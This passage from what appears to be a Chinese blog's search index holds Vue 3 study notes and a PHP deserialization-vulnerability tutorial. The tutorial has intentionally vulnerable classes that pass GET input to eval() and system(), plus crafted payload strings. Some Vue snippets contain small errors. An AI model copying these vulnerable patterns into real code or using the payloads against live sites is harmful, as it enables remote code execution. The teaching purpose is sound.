<HelloWorld/>\n</template>\n\n<script>\nimport { provide } from 'vue';\nimport HelloWorld from './components/HelloWorld.vue'\n\nexport default {\n        name: 'App',\n        components: {\n                HelloWorld\n        },\n        setup() {\n                provide(\"msg\",\"provide的消息\")\n        }\n}\n</script>\n\n<style>\n#app {\n        font-family: Avenir, Helvetica, Arial, sans-serif;\n        -webkit-font-smoothing: antialiased;\n        -moz-osx-font-smoothing: grayscale;\n        text-align: center;\n        color: #2c3e50;\n        margin-top: 60px;\n}\n</style>\n```\n\n## Fragment\n\n![image-20250305163230321](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305163230321.png)\n\n# Element-Plus\n\n官网:https://element-plus.sxtxhy.com/zh-CN/\n\n## 安装\n\n```bash\nnpm install element-plus --save\n```\n\n## 完整引入\n\n![image-20250305163955494](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305163955494.png)\n\n```js\n//main.js\nimport { createApp } from 'vue'\nimport ElementPlus from 'element-plus'//引入组件\nimport 'element-plus/dist/index.css'//必须引入css样式\nimport App from './App.vue'\nimport './registerServiceWorker'\n\ncreateApp(App).use(ElementPlus).mount('#app')//.use挂载组件\n```\n\n在官网上复制相关组件的代码\n\n## 按需引入\n\n![image-20250305164149182](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305164149182.png)\n\n```bash\nnpm install -D unplugin-vue-components unplugin-auto-import\n```\n\n![image-20250305164419439](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305164419439.png)\n\n```js\n//vue.config.js\nconst { defineConfig } = require('@vue/cli-service')\nconst AutoImport = require('unplugin-auto-import/webpack')\nconst Components = require('unplugin-vue-components/webpack')\nconst { ElementPlusResolver } = require('unplugin-vue-components/resolvers')\n\nmodule.exports = defineConfig({\n  transpileDependencies: true,\n  configureWebpack: {\n    plugins: [\n      AutoImport({\n        resolvers: [ElementPlusResolver()]\n      }),\n      Components({\n        resolvers: [ElementPlusResolver()]\n      })\n    ]\n  }\n})\n```\n\n\n\n## 加载字体图标\n\n```bash\nnpm update unplugin-auto-import unplugin-vue-components\nnpm install @element-plus/icons-vue\n```\n\n### 全局注册\n\n创建/src/plugins/icon.js\n\n![image-20250305194014301](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305194014301.png)\n\n```js\n//icon.js\nimport * as components from \"@element-plus/icons-vue\";\nexport default {\n        install: (app) => {\n                for (const key in components) {\n                        const componentConfig = components[key];\n                        app.component(componentConfig.name, componentConfig);\n                }\n        },\n};\n```\n\n```js\n//main.js\nimport { createApp } from 'vue'\nimport App from './App.vue'\nimport './registerServiceWorker'\nimport 'element-plus/dist/index.css'\nimport icon from './plugins/icon'//引入icon.js\n\ncreateApp(App).use(icon).mount('#app')\n```\n\n然后从官网复制图像的代码\n\n# Vue应用\n\n## 应用实例\n\n![image-20250305201555244](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305201555244.png)\n\nVue的实例对象有且仅有一个\n\n## 根组件\n\n![image-20250305202022580](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305202022580.png)\n\n## 挂载应用\n\n![image-20250305202151292](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305202151292.png)\n\n#app会去index.html(与src同级)中寻找dom元素app\n\n![image-20250305203330731](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305203330731.png)\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>Vue</title>\n</head>\n<body>\n        <div id=\"app\">\n                111\n        </div>\n        <script type=\"module\" src=\"/src/main.js\"></script>\n</body>\n</html>\n```\n\n\n\n## 公共资源\n\n![image-20250305203011640](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305203011640.png)\n\n# 两种风格的API\n\n## 选项式API\n\n![image-20250305203514881](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305203514881.png)\n\n```bash\nnpm init vue@latest\n```\n\n```html\n<template>\n        <button @click=\"Increment\">count = {{ count }}</button>\n</template>\n\n<script>\nexport default {\n        data() {\n                return {\n                        count: 0\n                }\n        },\n        methods: {\n                Increment() {\n                        this.count++;\n                }\n        }\n}\n</script>\n\n<template>\n  <Options />\n</template>\n\n<script>\nimport Options from './components/Options.vue';\nexport default{\n  components:{\n    Options\n  }\n}\n</script>\n```\n\n\n\n## 组合式API\n\n![image-20250305205142028](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305205142028.png)\n\n```html\n<template>\n        <button @click=\"Increment\">count = {{ count }}</button>\n</template>\n\n<!-- 使用 <script setup> 语法糖，不用显式返回对象 -->\n<script setup>\n        import {ref,onMounted} from 'vue'\n        const count = ref(0);\n\n        function Increment(){\n                count.value ++;\n        }\n\n        onMounted(()=>{\n\n        })\n</script>\n```\n\n## 简约写法\n\n```html\n<script setup></script>\n```\n\n{% raw %}是一种语法糖，不用在setup()中显式return,直接在template中{{ }}调用就行，但是就不能组合式与选项式混写，只能组合式{% endraw %}\n\n## 组合式与选项式的区别\n\n![image-20250305210454512](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305210454512.png)\n\n# 响应式\n\n## 组合式\n\n```html\n<template>\n        <h3>{{ message }}</h3><br>\n        <h3>{{ obj.name }}</h3>\n</template>\n\n<!-- <script setup>语法糖，不用显示return{} -->\n<script setup>\nimport { reactive, ref } from 'vue';\n\nconst message=ref(\"Com~\");\nconst obj = reactive({\n        name:\"jellycat\",\n        message:message\n})\n</script>\n```\n\n![image-20250305211426791](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305211426791.png)\n\n![image-20250305211638443](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305211638443.png)\n\n## 选项式\n\n```html\n<template>\n        <h3>{{ message }}</h3><br>\n</template>\n\n<script>\n        export default{\n                data(){\n                        return{\n                                message:\"Options!\"\n                        }\n                }\n        }\n</script>\n```\n\n# 计算属性\n\n## 组合式\n\n```html\n<template>\n        <h3>Com-reverse:{{ res }}</h3>\n</template>\n\n<script setup>\n        import { ref,computed } from 'vue';\n\n        const message = ref(\"Hello World!\");\n\n        const res = computed(() =>{\n                //调用ref对象的值必须.value\n                return message.value.split(\"\").reverse().join('');\n        })\n</script>\n```\n\n![image-20250305215101732](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305215101732.png)\n\n优势：可以把内容单独拆到一个文件中\n\neg：\n\n```js\nimport { computed } from 'vue';\n\nexport function MyDemo(message) {\n        const demo =  computed(() => {\n                return message.value + \"114514\";\n        })\n        return demo\n}\n```\n\n```html\n<template>\n        <h3>Com-reverse:{{ res }}</h3>\n        <h3>demo:{{ res1 }}</h3>\n</template>\n\n<script setup>\n        import { ref,computed } from 'vue';\n        import {MyDemo} from './Comcomputedsingle'//引入函数\n\n        const message = ref(\"Hello World!\");\n\n        const res = computed(() =>{\n                //调用ref对象的值必须.value\n                return message.value.split(\"\").reverse().join('');\n        })\n\n        const res1 = MyDemo(message);\n</script>\n```\n\n\n\n## 选项式\n\n```html\n<template>\n        <h3>Opt-Reverse:{{ Fliter }}</h3>\n</template>\n\n<script>\nexport default{\n        data(){\n                return {\n                        message:\"Hello World!\"\n                }\n        },\n        computed:{\n                Fliter(){\n                        return this.message.split(\"\").reverse().join();\n                }\n        }\n}\n</script>\n```\n\n# 组合式API_事件处理\n\n```html\n<template>\n        <button @click=\"Increment\">选项式API:Count = {{ count }}</button><br>\n</template>\n\n<script>\nexport default{\n        data(){\n                return{\n                        count:0\n                }\n        },\n        methods:{\n                Increment(){\n                        this.count++\n                }\n        }\n}\n</script>\n\n<template>\n        <button @click=\"Increment\">组合式API: count = {{ count }}</button>\n</template>\n\n<script setup>\n         import {ref} from 'vue'\n\n         const count = ref(0);\n\n         function Increment(){\n                count.value++;\n         }\n</script>\n```\n\n# 组合式API_侦听器\n\n![image-20250306185957297](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250306185957297.png)\n\n```html\n<template>\n        <button @click=\"Increment\">{{ count }}</button>\n</template>\n\n<script>\n        export default{\n                data(){\n                        return{\n                                count:0\n                        }\n                },\n                methods:{\n                        Increment(){\n                                this.count++\n                        }\n                },\n                watch:{\n                        //方法名就是要监听的变量\n                        count(OldValue,NewValue){\n                                console.log(OldValue,NewValue);\n                        }\n                }\n        }\n</script>\n```\n\n```html\n<template>\n        <button @click=\"Increment\">{{ count }}</button>\n</template>\n\n<script setup>\n        import {ref,watch} from 'vue'\n        count = ref(0);\n        function Increment(){\n                count.value++\n        };\n\n        //参数1:要监听的变量,残数2:带两个参数的箭头函数\n        watch(count,(OldValue,NewValue) => {\n                console.log(OldValue,NewValue);\n        })\n</script>\n```\n\n将侦听器放到单独一个文件中\n\n```js\nimport {watch} from 'vue'\n\nexport function Watcher(count){\n        watch(count,(OldValue,NewValue) => {\n                console.log(OldValue,NewValue);\n                \n        })\n}\n```\n\n注意:watch监听时，ref对象不需要.value\n\n# 组合式API_生命周期\n\n```html\n<!-- 选项式 -->\n<template>\n\n</template>\n\n<script>\nexport default{\n        beforeCreate(){\n\n        },\n        created(){\n\n        },\n        beforeMount(){\n\n        },\n        mounted(){\n\n        },\n        beforeUpdate(){\n\n        },\n        updated(){\n\n        },\n        beforeUnmount(){\n\n        },\n        unmounted(){\n                \n        }\n\n}\n</script>\n```\n\n```html\n<!-- 组合式API,优点是可以同时存在多个生命周期函数 -->\n<template>\n\n</template>\n\n<script>\n        import { onMounted, onUpdated } from 'vue'\n        onMounted(() => {\n\n        }),\n        onUpdated(() => {\n\n        })\n\n\n</script>\n```\n\n# 组合式API_模板引用\n\n```html\n<!-- 组合式API -->\n<template>\n        <h3 ref=\"message\">Opt</h3>\n</template>\n<script>\n        export default{\n                mounted(){\n                        this.$refs.message.innerHTML='OOOppt';\n                }\n        }\n</script>\n```\n\n```html\n<!-- 选项式API -->\n<template>\n        <h3 ref=\"message\">Com</h3>\n</template>\n<script setup>\n        import {ref,onMounted} from 'vue'\n\n        //获取原生DOM,声明一个ref来存放该元素的引用，必须和模板中的ref同名，否则读取不到\n        const message = ref(null);\n        //修改DOM内容前提是页面已渲染，所以该操作要放在生命周期函数中\n        onMounted(()=>{\n                message.value.innerHTML = 'CCCOOM';\n        })\n        \n</script>\n```\n\n# 组合式API_Props\n\n```html\n<!-- 选项式API父组件 -->\n<template>\n        <OptChild msg=\"114514\" />\n</template>\n\n<script>\n        import OptChild from './OptChild.vue'\n        export default{\n                components:{\n                        OptChild,\n                }\n        }\n</script>\n\n<!-- 选项式API子组件 -->\n<template>\n        <p>{{ msg }}</p>\n</template>\n\n<script>\nexport default {\n        props: {\n                msg: {\n                        type: String,\n                        default: \"\"\n                },\n        }\n}\n</script>\n```\n\n```html\n<!-- 组合式API父组件 -->\n<template>\n        <!-- 不用再去export default中挂载组件 -->\n        <ComChild msg=\"1919810\"/>\n</template>\n\n<script setup>\n        import ComChild from './ComChild.vue';\n</script>\n<!-- 组合式API子组件 -->\n<template>\n        <p>{{ msg }}</p>\n</template>\n\n<script setup>\n        //defineProps的方式进行接收,内部是对象的形式\n        defineProps({\n                msg:{\n                        type:String,\n                        default:\"\"\n                },\n        });\n</script>\n```\n\n# 组合式API_事件\n\n```html\n<!-- 选项式API子组件 -->\n<template>\n        <button @click=\"sendMsg\">发送数据</button>\n</template>\n\n<script>\nexport default {\n        data(){\n                return{\n                        message:\"114514\"\n                }\n        },\n        methods:{\n                sendMsg(){\n                        this.$emit('OnEvent',this.message);\n                }\n        }\n}\n</script>\n<!-- 选项式API父组件 -->\n<template>\n        <OptChild @onSomeEvent=\"acpt\" />\n        <p>接收数据:{{ message }}</p>\n</template>\n\n<script>\n        import OptChild from './OptChild.vue';\n        export default{\n                components:{\n                        OptChild,\n                },\n                data(){\n                        return{\n                                message:\"\"\n                        }\n                },\n                methods:{\n                        acpt(data){\n                                this.message = data;\n                        }\n                }\n        }\n</script>\n```\n\n```html\n<!-- 组合式API父组件 -->\n<template>\n        <ComChild @onEvent=\"getMsg\" />\n        <p>收到数据{{ message }}</p>\n</template>\n\n<script setup>\n        import ComChild from './ComChild.vue';\n        import {ref} from 'vue'\n\n        const message = ref(\"\");\n\n        function getMsg(data){\n                message.value = data;\n                // console.log(data);\n                \n        }\n</script>\n<!-- 组合式API子组件 -->\n<template>\n        <button @click=\"sendMsg\">获取数据</button>\n</template>\n\n<script setup>\n        import {ref} from 'vue'\n        const message = ref(\"1919810\");\n        //相当于获取this.$emit\n        const emit = defineEmits([\"onEvent\"]);\n\n        function sendMsg(){\n                emit(\"onEvent\",message.value);\n        }\n</script>\n```\n\n# 自定义指令\n\n## 选项式\n\n```html\n<template>\n        <!-- 用v-自定义指令来调用自定义指令 -->\n        <h3 v-jellycat>hello world</h3>\n</template>\n\n<script>\n        export default{\n                //通过directives创建自定义指令\n                directives:{\n                        //指令名\n                        jellycat:{\n                                //指令要做什么\n                                mounted(element){\n                                        console.log(element);\n                                        \n                                }\n                        }\n                }\n        }\n</script>\n```\n\n\n\n## 组合式\n\n```html\n<template>\n        <span v-jellycat>hello</span>\n</template>\n\n<script setup>\n        // 前面+v表示自定义指令\n        const vJellycat = {\n                //注意写法 mouted:\n                mounted:(element) => {\n                        console.log(element);\n                        \n                        // 内部逻辑\n                }\n        }\n</script>\n```\n\n# 全局与局部自定义指令\n\n![image-20250306213559556](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250306213559556.png)\n\n## 局部\n\n```html\n<template>\n        <h3 v-scp>Scoped</h3>\n</template>\n\n<script setup>\n        const vScp = {\n                mounted(element){\n                        element.style.color = \"green\"\n                }\n        }\n</script>\n```\n\n# 全局\n\n需要在main.js中创建自定义指令\n\n```js\n\nimport './assets/main.css'\n\nimport { createApp } from 'vue'\nimport App from './App.vue'\n\nconst app = createApp(App);\n//参数1:指令名 参数2:箭头函数,指令实现的功能\napp.directive(\"glb\",(Element) => {\n        Element.style.color = \"blue\"\n})\napp.mount('#app')\n\n```\n\n# 自定义指令的钩子函数\n\n![image-20250306214800105](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250306214800105.png)\n\n![image-20250306214903950](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250306214903950.png)\n\n![image-20250306214921379](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250306214921379.png)\n\n## 参数\n\n![image-20250306215347379](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250306215347379.png)\n\neg.模拟v-show\n\n```html\n<template>\n        <p v-myShow=\"true\">11</p>\n</template>\n\n<script setup>\nimport {ref} from 'vue'\nconst flag = ref(true)\n        const vMyShow = {\n                mounted(el,binding,vNode,prevNode){\n                        if(binding.value){\n                                el.style.display = 'block';\n                        }else{\n                                el.style.display = 'none';\n                        }\n                }\n        }\n</script>\n```\n\n","tags":["Web开发","Vue"],"categories":["Web开发","Vue"]},{"title":"php反序列化漏洞","url":"/2025/01/27/php反序列化/","content":"\n# 反序列化漏洞\n\n成因：反序列化unserialize()中接收的字符串可控，通过更改字符串得到想要的对象\n\n# php面向对象基础知识\n\n## php中类和对象的写法\n\n```php\nclass Test{\n\tvar $name;//不推荐用var修饰，可以用public,private,protected修饰（与java一致）\n\tvar $id;\n\n\tfunction __construct($name = null,$id = null){//构造函数\n\t\t$this->name = $name;\n\t\t$this->id = $id;\n\t}\n}\n\nclass Test{\n\tvar $name;\n\tvar $id;\n\n\tfunction __construct($name = null,$id = null){\n\t\t$this->name = $name;\n\t\t$this->id = $id;\n\t}\n}\n\n$a = new Test();\n$a->name='senpai';\n$a->id=114514;\nprint_r($a);\n/*print_r()打印对象实例的结果就是:>\nTest Object\n(\n    [name] => senpai\n    [id] => 114514\n)\n[Finished in 852ms]\n*/\n```\n\n`php中构造函数不支持重载，如果想实现无参构造器和有参构造器都存在，要在参数中设置默认值;php访问内部成员用的是$this->成员变量名`\n\n# 序列化\n\n![image-20250127151543708](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250127151543708-1748186529230.png)\n\n可以进行序列化的内容：\n\n`对象，数组，标量类型（整形，浮点，布尔，字符串），包含资源的数组和对象，null`\n\n不能序列化的内容：\n\n`类，资源（比如数据库连接），未定义类型`\n\n![image-20250127152858600](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250127152858600.png)\n\n字符串长度用于确定头尾双引号位置，防止出现 `\"benben\"adada\"这种中间带有双引号报错的情况`\n\n![image-20250127160337212](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250127160337212.png)\n\n`a:参数数量:{i:索引;对应的序列化内容;}`\n\n![image-20250127160558701](C:/Users/27251/Desktop/笔记/服务外包/img_phpser/image-20250127160558701.png)\n\n![image-20250127162928408](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250127162928408.png)\n\n`O:类名长度:\"类名\":变量数:{s:变量名长度:\"变量名\";变量值的序列化内容;}`\n\n`private属性的成员变量序列化后，变量名前会加上0x00类名0x00(0x00是不可见字符，url编码后就是%00)`\n\n`protected属性的成员变量序列化后，变量名前会加上0x00*0x00`\n\n```php\n<?php\n\tclass Test{\n\t\tpublic $name;\n\t\tprivate $id;\n\t}\n\t$a = 1;\n\t$b = 'hello world!';\n\t$c = new Test();\n\t$d = [1,2,3,4];\n\t$e = 1.14514;\n\t$f = null;\n\n\techo serialize($a).\"\\n\";\n\techo serialize($b).\"\\n\";\n\techo serialize($c).\"\\n\";\n\techo serialize($d).\"\\n\";\n\techo serialize($e).\"\\n\";\n\techo serialize($f);\n?>\n/*\ni:1;\ns:12:\"hello world!\";\nO:4:\"Test\":2:{s:4:\"name\";N;s:8:\"<0x00>Test<0x00>id\";N;}\na:4:{i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;}\nd:1.14514;\nN;\n   [Finished in 1.1s]\n*/\n```\n\n\n\n# 反序列化\n\n反序列化就是将字符串变成对象 unserialize(string $str)\n\n![image-20250127202854791](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250127202854791.png)\n\n![image-20250127202928917](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250127202928917.png)\n\n### 例题\n\n![image-20250127213806615](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250127213806615.png)\n\n\n\nget方法传进来的变量benben就是序列化字符串\n\n![image-20250127215108215](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250127215108215.png)\n\n```php\n/*自动把get请求收到的参数拼接到序列化字符串中*/\n$get = 'O:4:\"test\":1:{s:1:\"a\";s:'.strlen($_GET['benben']).':\"'.$_GET['benben'].'\";}';\n```\n\n构造url，用?传递get请求的参数(这里我让他弹窗)\n\n`?benben=O:4:\"test\":1:{s:1:\"a\";s:36:\"echo \"<script>alert(123);</script>\";\";}`\n\n## 使用var_dump()打印对象细节\n\n```php\n<?php\n\tclass Test{\n\t\tpublic $id;\n\t\tprivate $name;\n\t\tprotected $sex;\n\n\t\tpublic function __construct($id = null,$name = null,$sex = null){\n\t\t\t$this->id = $id;\n\t\t\t$this->name = $name;\n\t\t\t$this->sex = $sex;\n\t\t}\n\t}\n\n\t$a = new Test(123,'淳平','男');\n\tvar_dump($a);\n?>\n/*\nobject(Test)#1 (3) {\n  [\"id\"]=>\n  int(123)\n  [\"name\":\"Test\":private]=>\n  string(6) \"淳平\"\n  [\"sex\":protected]=>\n  string(3) \"男\"\n}\n   [Finished in 933ms]\n*/\n```\n\n```php\n<?php\n\tclass Test{\n\t\tpublic $id;\n\t\tprivate $name;\n\t\tprotected $sex;\n\n\t\tpublic function __construct($id = null,$name = null,$sex = null){\n\t\t\t$this->id = $id;\n\t\t\t$this->name = $name;\n\t\t\t$this->sex = $sex;\n\t\t}\n\t}\n\n\t$a = new Test(123,'淳平','男');\n\techo serialize($a).\"\\n\";\n\t$str = 'O:4:\"Test\":3:{s:2:\"id\";i:123;s:10:\"%00Test%00name\";s:6:\"淳平\";s:6:\"%00*%00sex\";s:3:\"男\";}';//复制echo内容\n\t$str = urldecode($str);\n\tvar_dump(unserialize($str));\n?>\n\n/*\nobject(Test)#2 (3) {\n  [\"id\"]=>\n  int(123)\n  [\"name\":\"Test\":private]=>\n  string(6) \"淳平\"\n  [\"sex\":protected]=>\n  string(3) \"男\"\n}\n*/\n```\n\n```php\n/**/\n<?php\n\tclass Test{\n\t\tpublic $id;\n\t\tprivate $name;\n\t\tprotected $sex;\n\n\t\tpublic function __construct($id = null,$name = null,$sex = null){\n\t\t\t$this->id = $id;\n\t\t\t$this->name = $name;\n\t\t\t$this->sex = $sex;\n\t\t}\n\t}\n\n\t$a = new Test(123,'淳平','男');\n\techo serialize($a).\"\\n\";\n\t/*反序列化生成对象中成员变量的值，由提供给反序列化的序列化字符串中的值决定*/\n\t$str = 'O:4:\"Test\":3:{s:2:\"id\";i:123;s:10:\"%00Test%00name\";s:6:\"德川\";s:6:\"%00*%00sex\";s:3:\"男\";}';\n\t$str = urldecode($str);\n\tvar_dump(unserialize($str));\n?>\n/*\nO:4:\"Test\":3:{s:2:\"id\";i:123;s:10:\"�Test�name\";s:6:\"淳平\";s:6:\"�*�sex\";s:3:\"男\";}\nobject(Test)#2 (3) {\n  [\"id\"]=>\n  int(123)\n  [\"name\":\"Test\":private]=>\n  string(6) \"德川\" 输出德川而不是最开始的淳平，因为更改了序列化字符串\n  [\"sex\":protected]=>\n  string(3) \"男\"\n}\n*/\n```\n\n# 魔术方法\n\n魔术方法：在特定条件下自动触发的方法\n\n`触发前提：魔术方法所在的类或对象被调用`\n\n![image-20250128111628642](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250128111628642.png)\n\n**魔术方法必须掌握触发时机，参数，返回值**\n\n![image-20250525232507387](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250525232507387.png)\n\n常见魔术方法\n\n![image-20250128111915497](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250128111915497.png)\n\n### 构造与析构\n\n```php\n/*构造\n触发时机:当new对象时自动调用（构造器）\n功能:初始化对象\n参数:非必要\n返回值:无\n*/\n\nfunction __construct(args...);\n/*析构\n触发时机:对象的所有引用被删除或对象被显式销毁时执行,反序列化之后执行,代码运行结束执行\n功能:\n参数:无\n返回值:无\n*/\nfunction __destruct();\n\n<?php\nclass Test{\n\tpublic $name;\n\tpublic function __construct(){\n\t\techo '构造函数'.\"\\n\";\n\t}\n\n\tpublic function __destruct(){\n\t\techo '析构函数'.\"\\n\";\n\t}\n}\n\n$a = new Test();//触发__construct();\n$str  = serialize($a);\n$str1 = 'O:4:\"Test\":1:{s:4:\"name\";N;}';\n$f = unserialize($str1); //触发__destruct();\n?>//触发__destruct();\n    \n/*\n结果\n构造函数\n析构函数\n析构函数\n*/\n```\n\n`unserialize()触发析构函数是因为,反序列化是将原先实例销毁，再根据序列化字符串创建新对象`\n\n```php\n<?php\nclass Test{\n\tpublic $name;\n\tpublic function __construct($name = null){\n\t\t$this->name = $name;\n\t\techo '构造函数'.\"\\n\";\n\t}\n\n\tpublic function __destruct(){\n\t\techo '析构函数'.\"\\n\";\n\t}\n}\n\n$a = new Test('淳平');\n$str  = serialize($a);\n$f = unserialize($str);//$a被销毁了\necho $a->name;//这里会警告$a为null\n?>\n```\n\n#### 漏洞例题\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User\n{\n\tvar $cmd = \"echo 'dazhuang666!!';\";\n\tpublic function __destruct()\n\t{\n\t\teval($this->cmd);//漏洞在这\n\t}\n}\n$ser = $_GET[\"benben\"];\nunserialize($ser);//会在这调用__destruct()\n\n?>\n```\n\n`需要构造序列化字符串，将$cmd改成要执行的php命令`\n\n```php\n/*构造字符串*/\n$str = 'O:4:\"User\":1:{s:3:\"cmd\";s:20:\"echo \"Hello World!\";\";}';\n```\n\n`构造url，拼接参数?benben=O:4:\"User\":1:{s:3:\"cmd\";s:20:\"echo \"Hello World!\";\";}到localhost/ser后`\n\n### sleep\n\n`先进行__sleep()再serialize()`\n\n![image-20250128144606071](C:\\Users\\27251\\Desktop\\笔记\\服务外包\\img_phpser\\image-20250128144606071.png)\n\n```php\nfunction __sleep();\n/*返回要序列化的属性名的数组\n触发时机：执行serialize()之前\n功能：返回需要被序列化的成员\n参数：无\n返回值：包含需要被序列化的成员属性名的数组\n*/\n\n<?php\nclass User{\n\tpublic $name;\n\tpublic $id;\n\tprivate $password;\n\n\tpublic function __construct($name = null,$id = null,$password = null){\n\t\t$this->name = $name;\n\t\t$this->id = $id;\n\t\t$this->password = $password;\n\t}\n\n\tpublic  function __sleep(){\n\t\treturn array('name','id');//返回包含属性名的数组\n\t}\n\t\n}\n$a = new User('淳平',114514,'114514');\n\necho serialize($a);//结果中将不会有password\n-- - - - - -- - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n/*O:4:\"User\":2:{s:4:\"name\";s:6:\"淳平\";s:2:\"id\";i:114514;}*/\n```\n\n#### 例题\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User\n{\n\tconst SITE = 'uusama';\n\tpublic $username;\n\tpublic $nickname;\n\tprivate $password;\n\tpublic function __construct($username, $nickname, $password)\n\t{\n\t\t$this->username = $username;\n\t\t$this->nickname = $nickname;\n\t\t$this->password = $password;\n\t}\n\tpublic function __sleep()\n\t{\n\t\tsystem($this->username);//漏洞\n\t}\n}\n$cmd = $_GET['benben'];\n$user = new User($cmd, 'b', 'c');\necho serialize($user);\n?>\n```\n\n`因为__sleep()在serialize()前执行,$cmd对应的就是$username，所以我们只需要把get请求的参数换成任意的命令就行`\n\n### wakeup\n\n![image-20250128152746018](C:\\Users\\27251\\Desktop\\笔记\\服务外包\\img_phpser\\image-20250128152746018.png)\n\n```php\nfunction __wakeup();\n/*\n触发时机：unserialize()之前\n功能：\n参数：\n返回值：\n*/\n\n<?php\nclass User{\n\tpublic $name;\n\tpublic $id;\n\tprivate $password;\n\n\tpublic function __construct($name = null,$id = null,$password = null){\n\t\t$this->name = $name;\n\t\t$this->id = $id;\n\t\t$this->password = $password;\n\t}\n\n\tpublic function __sleep(){\n\t\treturn array('name','id');\n\t}\n\n\tpublic function __wakeup(){\n\t\t$this->password = '114514';//反序列化前调用，给password赋值\n\t}\n}\n$str = 'O:4:\"User\":2:{s:4:\"name\";s:6:\"淳平\";s:2:\"id\";i:114514;}';//没有password\nvar_dump(unserialize($str));//password有值了\n?>\n/*\nobject(User)#1 (3) {\n  [\"name\"]=>\n  string(6) \"淳平\"\n  [\"id\"]=>\n  int(114514)\n  [\"password\":\"User\":private]=>\n  string(6) \"114514\"\n}\n*/\n```\n\n#### 例题\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User {\n    const SITE = 'uusama';\n    public $username;\n    public $nickname;\n    private $password;\n    private $order;\n    public function __wakeup() {\n        system($this->username);//漏洞\n    }\n}\n$user_ser = $_GET['benben'];//需要构造一个含有username的序列化字符串\nunserialize($user_ser);\n?>\n```\n\n`思路:构造get参数为一个含有username的序列化字符串，username值为任意命令\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tpayload:  ?benben=O:4:\"User\":1:{s:8:\"username\";s:20:\"echo \"hello world!\";\";}`\n\n### toString和invoke\n\n\n\n```php\nfunction __toString();\n/*\n触发时机：把对象当作字符串调用;调用对象要使用var_dump()或print_r(),使用echo或print就会调用__toString()\n功能：\n参数：\n返回值：字符串\n*/\nfunction __invoke();\n/*\n触发时机：把对象当作方法(函数)调用\n功能：\n参数：\n返回值：字符串\n*/\n\n<?php\nclass User{\n\tpublic $id;\n\tpublic $username;\n\tprivate $password;\n\n\tpublic function __construct($id = null,$username = null,$password = null){\n\t\t$this->id = $id;\n\t\t$this->username = $username;\n\t\t$this->password = $password;\n\t}\n\n\tpublic function __tostring(){\n\t\treturn '这不是字符串!';\n\t}\n\n\tpublic function __invoke(){\n\t\treturn '这不是方法!!';\n\t}\n}\n$a = new User(1,'a','c');\necho $a;//输出这不是字符串\necho $a();//输出这不是方法\n?>\n```\n\n### 错误调用相关魔术方法\n\n#### call\n\n![image-20250128170411067](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250128170411067.png)\n\n```php\nfunction __call($arg1,$arg2);\n/*\n触发时机:调用不存在的成员方法\n功能：\n参数:$arg1:方法名 $arg2:参数值的数组\n返回值:无\n*/\n<?php\nclass User{\n\tpublic $id;\n\tpublic $username;\n\tprivate $password;\n\n\tpublic function __construct($id = null,$username = null,$password = null){\n\t\t$this->id = $id;\n\t\t$this->username = $username;\n\t\t$this->password = $password;\n\t}\n\n\tpublic function __call($arg1,$arg2){\n\t\techo $arg1.\"\\n\";\n\t\tfor($i = 0;$i < count($arg2); ++$i){//把传进去的所有参数打印出来\n\t\t\techo $arg2[$i].\"\\n\";\n\t\t}\n\t}\n}\n\n$a = new User();\n\n$a->test('a','b','c');//会调用call()\n?>\n/*\ntest\na\nb\nc\n*/\n```\n\n#### callStatic\n\n![image-20250128171410835](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250128171410835.png)\n\n```php\nfunction __callStatic($arg1,$arg2);\n/*\nphp中调用成员常量或静态调用: ::\n$arg1:方法名\t$arg2:参数值的数组\n*/\n\n<?php\nclass User{\n\tpublic $id;\n\tpublic $username;\n\tprivate $password;\n\n\tpublic function __construct($id = null,$username = null,$password = null){\n\t\t$this->id = $id;\n\t\t$this->username = $username;\n\t\t$this->password = 